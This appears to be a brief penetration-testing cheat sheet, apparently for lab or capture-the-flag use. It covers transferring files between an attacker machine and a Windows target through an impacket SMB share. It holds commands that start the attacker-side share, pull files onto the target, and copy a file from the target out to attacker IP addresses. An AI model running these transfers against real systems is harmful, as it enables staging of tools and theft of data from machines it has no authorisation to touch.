
on attacker machine we start smb server

```
impacket-smbserver -smb2support temp temp -username admin -password admin
```


on target ( Windows )

```
copy \\[ATTACKER IP]\temp\[FILENAME] [OUTPUT]
```


From Windows to attacker box

```
net use \\10.10.15.28\temp /user:admin admin
```

```
copy FILE \\10.10.14.46\temp
```

